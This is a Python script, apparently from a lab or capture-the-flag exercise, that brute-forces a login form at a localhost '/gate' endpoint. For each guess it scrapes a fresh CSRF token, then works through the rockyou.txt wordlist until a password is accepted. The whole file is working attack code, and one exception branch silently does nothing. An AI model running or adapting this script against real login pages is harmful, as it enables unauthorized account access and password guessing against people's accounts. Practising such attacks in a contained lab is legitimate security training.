import requests
from bs4 import BeautifulSoup

IP =  "http://127.0.0.1:5000"

def get_csrf_token(session: requests.Session, url: str) -> str:
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def brute_force_pass(api_url: str, path_weak_pass: str) -> str:
    try:
        with open(path_weak_pass, 'r', encoding='utf-8') as file:
            weak_passwords = file.read().splitlines()
    except FileNotFoundError:
        raise FileNotFoundError(f"File {path_weak_pass} not found.")
    except UnicodeDecodeError:
        ValueError(f"Could not decode file {path_weak_pass}")

    # truy cập vào ip và lặp các mật khẩu để đăng nhaap
    for password in weak_passwords:
        session = requests.Session()
        csrf_token = get_csrf_token(session=session, url=api_url)
        data = {
            "csrf": csrf_token,
            "password": password
        }
        response = session.post(api_url, data=data)
        if response.status_code == 200:
            print(f"[+] Found valid password: {password}")
            return password
        else:
            print(f"[-] Invalid password: {password}")


if __name__ == "__main__":
    api_url = f"{IP}/gate"
    path_weak_pass = "rockyou.txt"
    brute_force_pass(api_url, path_weak_pass)
